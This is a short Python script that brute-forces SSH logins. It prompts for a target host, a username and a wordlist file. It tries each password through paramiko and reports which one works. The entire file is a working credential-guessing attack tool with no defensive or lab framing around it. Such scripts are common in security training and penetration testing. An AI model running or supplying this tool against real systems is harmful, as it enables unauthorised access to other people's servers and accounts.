import paramiko, sys, os, socket, termcolor

# Function to establish an SSH connection using a given password
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()  # Create an SSH client object
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys

    try:
        ssh.connect(host, port=22, username=username, password=password)  # Attempt SSH connection
    except paramiko.AuthenticationException:
        code = 1  # Authentication failure
    except socket.error as e:
        code = 2  # Socket error (unable to connect)

    ssh.close()  # Close the SSH connection
    return code  # Return the connection result code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

# Open the specified password file in read mode
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()  # Remove leading/trailing whitespace from the password
        try:
            response = ssh_connect(password)  # Attempt to connect using the current password
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
                break  # Stop the loop if a successful password is found
            elif response == 1:
                print('[-] Incorrect Login: ' + password)  # Print a message for incorrect login
            elif response == 2:
                print('[!!] Can\'t Connect')  # Print a message for connection failure
                sys.exit(1)  # Exit the script with an error code
        except Exception as e:
            print(e)  # Print any exceptions that occur during the connection attempt
            pass  # Continue to the next password in case of exception
